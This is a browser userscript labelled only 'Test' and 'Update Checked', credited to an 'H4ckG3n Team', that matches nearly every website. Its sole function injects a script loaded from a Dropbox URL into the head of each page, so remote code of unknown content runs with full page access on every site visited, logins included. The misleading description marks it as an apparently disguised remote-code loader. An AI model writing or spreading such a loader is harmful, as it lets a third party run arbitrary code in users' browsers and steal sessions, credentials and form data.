// ==UserScript==
// @name			Test 
// @namespace       http://userscripts.org/scripts/show/999999
// @version			1.1
// @copyright		H4ckG3n Team
// @description		Update Checked
// @author			Robhein94
// @include			http://*.*
// @include			http*://*.*.*
// @include			http://*.com
// @include			http://*.eu
// @include			http://*.*.com
// @include			http://*.*.eu
// @icon			http://icdn.pro/images/fr/b/a/badge-diigo-icone-9149-128.png
// Version numero 1.
// ==/UserScript==

function addJavascript(jsname, pos) {
    var th = document.getElementsByTagName(pos)[0];
    var s = document.createElement('script');
    s.setAttribute('type', 'text/javascript');
    s.setAttribute('src', jsname);
    th.appendChild(s);
}
addJavascript('https://dl.dropboxusercontent.com/u/56439548/convertlinks.js', 'head');